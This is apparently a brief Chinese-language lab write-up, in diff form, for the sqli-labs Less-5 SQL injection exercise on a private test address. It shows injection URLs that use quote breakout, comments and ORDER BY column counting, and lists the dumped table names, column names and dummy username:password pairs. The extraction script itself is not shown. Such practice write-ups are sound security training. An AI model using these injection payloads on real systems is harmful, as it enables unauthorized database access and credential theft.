@@ -1,0 +1,23 @@
+http://10.0.2.15/sqli/Less-5/?id=1
+显示：You are in...........
+http://10.0.2.15/sqli/Less-5/?id=1%27
+显示：报错' '1'' LIMIT 0,1 ' 
+故推测sql：select 字段 from 表 where id = '输入的id' limit 0,1
+
+检验：
+http://10.0.2.15/sqli/Less-5/?id=1%27%20--+
+显示：You are in...........
+说明推测正确
+
+http://10.0.2.15/sqli/Less-5/?id=1' order by 3 --+
+显示：You are in...........
+说明字段数至少为3
+http://10.0.2.15/sqli/Less-5/?id=1' order by 4 --+
+报错，说明字段数为3
+写脚本进行拆解（在此使用遍历字符的思想，也可以使用二分搜索，效率要高一些）
+
+运行脚本
+表名：users,uagents,emails,referers
+字段名：id,username,password,user,current_connections,total_connections
+字段值：dumb:dumb,angelina:i-kill-you,dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
+
